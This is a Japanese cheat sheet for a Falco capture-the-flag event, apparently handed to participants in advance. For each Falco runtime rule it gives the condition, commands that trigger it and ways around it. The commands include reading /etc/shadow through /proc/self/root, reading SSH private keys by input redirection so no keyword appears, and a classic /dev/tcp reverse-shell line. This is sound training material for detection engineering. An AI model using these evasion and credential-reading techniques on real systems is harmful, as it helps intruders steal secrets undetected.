# Falco CTF リファレンスカード

ワークスペースで詰まったときに横目で見るためのチートシート。
事前にざっと眺めておくと当日が楽になります。

---

## 1. 自分が誰か / どこにいるか

```bash
echo $FALCO_CTF_USER         # ユーザ名 (= ctf-<username> namespace の username)
cat /opt/ctf/INDEX.txt       # 10 ミッション一覧 (ログイン時に自動表示)
ls /opt/ctf/missions/        # ミッション directory
hostname                     # = pod 名 (workspace)
cat /etc/os-release          # alpine 3.20 ベース
```

---

## 2. Falco が観測しているフィールド (主要)

| フィールド | 意味 | どこから来るか |
|---|---|---|
| `fd.name` | open された fd の path | `openat(2)` 引数 |
| `fd.directory` | 上の dir 部分 | 〃 |
| `proc.name` | プロセスの comm (basename of exe) | `/proc/<pid>/comm` |
| `proc.pname` | **親**プロセスの comm | 〃 (parent) |
| `proc.cmdline` | コマンドライン文字列全体 | `/proc/<pid>/cmdline` |
| `proc.exe` | 実行ファイルのフルパス | kernel exec 情報 |
| `proc.aname[N]` | N 世代上の祖先 comm | 〃 |
| `container.image.repository` | コンテナイメージ名 | CRI socket |
| `k8s.ns.name` | Pod の Namespace | K8s API watcher |
| `k8s.pod.name` | Pod 名 | 〃 |

**重要**: ルールは syscall 単位で評価されますが、判定条件は **ほぼ
すべて文字列マッチ**です。同じ inode を別 path で開けば検知ロジック
からは別物に見えます。

---

## 3. このイベントで出題される Falco ルール

### 3.1 `Read sensitive file untrusted`

| 項目 | 内容 |
|---|---|
| 何を見るか | `fd.name` が `/etc/shadow` / `/etc/sudoers` / `/etc/pam.d/*` 等の sensitive_files に一致 |
| 発火条件 (大意) | `open_read` syscall で対象パスを開いた + 開いたプロセスが trusted リスト外 |
| 出題 | **02 (発火)**, **03 (回避)** |
| 回避の発想 | path 文字列マッチ → 同じファイルに別の path で到達できれば抜ける |

実 condition (抜粋): `open_read and sensitive_files and proc_name_exists and not proc.name in (許可リスト...) and not <user_known 例外>`

主な回避路 (例):
```bash
cat /etc/shadow                  # ← 発火する
cat /proc/self/root/etc/shadow   # ← 同じ inode、別 path。発火しない
cat /proc/$$/root/etc/shadow     # 〃
ln -s /etc/shadow /tmp/x; cat /tmp/x   # symlink 経由 (fd.name 解決は kernel 次第)
```

### 3.2 `Search Private Keys or Passwords`

| 項目 | 内容 |
|---|---|
| 何を見るか | `proc.cmdline` に `id_rsa` / `id_dsa` / `BEGIN.*PRIVATE KEY` / `AWS_SECRET` 等 |
| 発火条件 | 上記パターンを含むコマンドが exec された (結果は問わない) |
| 出題 | **04 (発火)**, **05 (回避)**, 10 (回避) |
| 回避の発想 | cmdline に keyword を出さない: 入力リダイレクト `<` / 環境変数経由 / 文字列分割 |

実 condition (抜粋): `spawned_process and ((grep_commands and private_key_or_password) or (proc.name=find and proc.args contains "id_rsa" ...))`

例:
```bash
find /tmp -iname id_rsa                 # ← 発火 (cmdline に "id_rsa")
cat /root/.ssh/id_rsa                   # ← 発火 (同上)

# 回避: 入力リダイレクトで cmdline に path を出さない
cat < /root/.ssh/id_rsa                 # ← cmdline = "cat" のみ → 発火しない
xxd < /root/.ssh/id_rsa | tail
```

### 3.3 `Run shell untrusted`

| 項目 | 内容 |
|---|---|
| 何を見るか | `proc.pname` (親 comm) が `protected_shell_spawner` (`httpd`/`nginx`/`apache2`/`postgres` 等) |
| 発火条件 | shell (bash/sh/zsh) が起動 + 親 comm が上記リスト |
| 出題 | **06 (発火)**, 10 (回避) |
| 回避の発想 | `proc.comm` は kernel が exec 時に basename から決める → 別名で動かす |

実 condition (抜粋): `spawned_process and shell_procs and proc.pname exists and protected_shell_spawner and not proc.pname in (shell_binaries, ...)`

例:
```bash
/opt/ctf/httpd                    # ← 親 comm = "httpd" → 発火
sh /opt/ctf/httpd                 # ← 親 comm = "sh"   → 発火しない
cat /opt/ctf/httpd | sh           # ← 親 comm = "cat" "sh" → 発火しない
```

### 3.4 `Contact K8S API Server From Container`

| 項目 | 内容 |
|---|---|
| 何を見るか | `evt.type=connect` + dst = K8s API server + `not k8s_containers` + `not user_known_*` |
| 発火条件 | system pod 以外のコンテナから K8s API への connect |
| 出題 | **01 (発火)**, 10 (回避) |
| 回避の発想 | API server に話しかけない (connect しない) |

実 condition (抜粋): `evt.type=connect and (fd.typechar=4 or fd.typechar=6) and container and k8s_api_server and not k8s_containers and not user_known_contact_k8s_api_server_activities`

例:
```bash
curl -sk https://kubernetes.default.svc/api    # ← 発火 (401 でも connect は通る)
```

### 3.5 `Drop and execute new binary in container`

| 項目 | 内容 |
|---|---|
| 何を見るか | `spawned_process` + container + `proc.is_exe_upper_layer=true` |
| 発火条件 | overlayfs の upper layer (= runtime に追加された層) から exec |
| 出題 | **07 (発火)**, 10 (回避) |
| 回避の発想 | base image に元々ある binary だけ使う |

実 condition (抜粋): `spawned_process and container and proc.is_exe_upper_layer=true and not container.image.repository in (known_drop_and_execute_containers)`

例:
```bash
cp /bin/sleep /tmp/x && /tmp/x 1    # ← 発火 (/tmp/x は upper layer)
/bin/sleep 1                         # ← 発火しない (base image の binary)
```

### 3.6 `Redirect STDOUT/STDIN to Network Connection in Container`

| 項目 | 内容 |
|---|---|
| 何を見るか | `dup` syscall + container + `fd.type ∈ {ipv4,ipv6}` + `evt.rawres ∈ {0,1,2}` |
| 発火条件 | network socket fd を stdin/stdout/stderr に dup する (= reverse shell の典型) |
| 出題 | **08 (発火)**, 10 (回避) |
| 回避の発想 | reverse shell pattern を使わない。data 転送は curl / wget で済ます |

実 condition (抜粋): `dup and container and evt.rawres in (0,1,2) and fd.type in ("ipv4","ipv6") and not user_known_stand_streams_redirect_activities`

例:
```bash
bash -c 'exec 1<>/dev/tcp/8.8.8.8/53'   # ← 発火 (dup2 of socket fd to fd 1)
bash -i >& /dev/tcp/host/port 0>&1       # ← 古典 reverse shell — 発火
curl https://example.com -o /tmp/x       # ← 普通の HTTP — 発火しない
```

### 3.7 `Create Hardlink Over Sensitive Files` / `Create Symlink Over Sensitive Files`

| 項目 | 内容 |
|---|---|
| 何を見るか | `link` / `symlink` syscall + 対象が `sensitive_files` macro 該当 |
| 発火条件 | sensitive file への hard/symbolic link 作成 |
| 出題 | **09 (発火: Hardlink)**, 10 (回避: Hardlink) |
| 回避の発想 | link せず `cp` で別 inode に複製。または別の sensitive 判定外ファイルへの link |

実 condition (抜粋, Hardlink): `create_hardlink and (evt.arg.oldpath in (sensitive_file_names))`

例:
```bash
ln /etc/sudoers /tmp/h                # ← 発火 (hardlink)
ln -s /etc/shadow /tmp/s              # ← 発火 (symlink、別 rule)
cp /etc/shadow /tmp/c                 # ← Create Hardlink は発火しない
                                      #    (が Read sensitive file untrusted は発火)
```

---

## 4. 「同じ inode に別 path で到達」する代表テクニック

| 方法 | 例 | 性質 |
|---|---|---|
| `/proc/<pid>/root` | `/proc/self/root/etc/shadow` | プロセスの mount namespace の root を指す symlink。**最も汎用** |
| Symbolic link | `ln -s /etc/shadow /tmp/x` | 多くの Falco ルールは fd.name に **解決後** の path を入れるので無効な場合あり |
| Hard link | `ln /etc/sudoers /tmp/x` | この環境では `/etc` 全体が別ファイルシステム (emptyDir) 上にあるため、`/etc` 配下の sensitive file を `/tmp` へ hardlink できない (`EXDEV`)。`/etc` 内の別 path (`ln /etc/sudoers /etc/x`) なら同一 fs なので成立する。**ただし** `Create Hardlink Over Sensitive Files` は `evt.arg.oldpath` のみを条件にしており、この `EXDEV` で失敗した `link` syscall でも発火する (destination の成否は検知ロジックに影響しない) |
| Bind mount | `mount --bind /etc/shadow /tmp/x; cat /tmp/x` | `mount --bind` は **CAP_SYS_ADMIN** を要するが、challenge コンテナは同 capability を付与せず privileged でもない (`charts/ctf-user/templates/pod.yaml` に `capabilities.add`・`privileged` なし) ため **この環境では実行不可** — 存在しない解法なので使わない |
| Tool 経由 | `busybox cat /etc/shadow` | `proc.name` が変わるが `fd.name` は変わらず — 検知に影響しないことが多い |

---

## 5. コマンド ↔ syscall 早見

| やりたいこと | 安全 (発火しない) | 危険 (発火する) |
|---|---|---|
| ファイルの中身を見る | `xxd /proc/self/root/<path>` | `cat <sensitive-path>` |
| 鍵ファイルを探す | (検知される語を含めない) | `find / -iname id_rsa` |
| shell を起こす | `bash -c 'echo hi'` (親が shell なら可) | 親 comm が httpd/nginx 等 |
| シェル探索 | `whatis cat` (alpine では `man-pages` パッケージ要) | — |

---

## 6. 行き詰まったときの定石

1. **Journey UI のヒントを段階的に開く** — 気付き→概要→解答の順で開示される
   (`welcome.txt` はシナリオ/背景の再確認に:
   `cat /opt/ctf/missions/<NN>-<slug>/fixtures/welcome.txt`)
2. **Falco ルール本体を読む** — 何を見ているかを直接確認
   - 参考: https://github.com/falcosecurity/rules/blob/main/rules/falco_rules.yaml
3. **`/proc/self/<...>`** に逃げる — `/proc/<pid>/root` / `/proc/<pid>/cmdline` 等
4. **シェル組み込み (builtin) で代用** — `cat foo.txt` → `printf '%s\n' "$(< foo.txt)"` 等
5. **fixtures 内のスクリプトを覗く** — `cat /opt/ctf/submit.sh` 等で
   提出ロジックの中身がわかる

---

## 7. このリファレンスの場所

- 事前配布版: `falco-ctf-app/challenges/REFERENCE.md` (本ファイル)
- ワークスペース内: 本イベントの版数では未バンドル (`PARTICIPANT-HANDBOOK.md`
  と一緒に運営から配布されているはず)

質問・修正提案は運営まで。
